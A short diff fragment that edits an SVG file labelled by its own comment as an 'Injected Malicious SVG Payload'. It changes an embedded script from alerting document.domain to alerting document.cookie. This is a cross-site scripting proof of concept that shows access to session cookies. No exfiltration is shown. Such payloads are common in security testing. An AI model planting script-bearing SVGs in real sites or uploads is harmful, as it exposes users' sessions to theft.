@@ -12,7 +12,7 @@
   <!-- Injected Malicious SVG Payload -->
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
     <script>//<![CDATA[
-        alert(document.domain)
+        alert(document.cookie)
     //]]>
     </script>
   </svg>
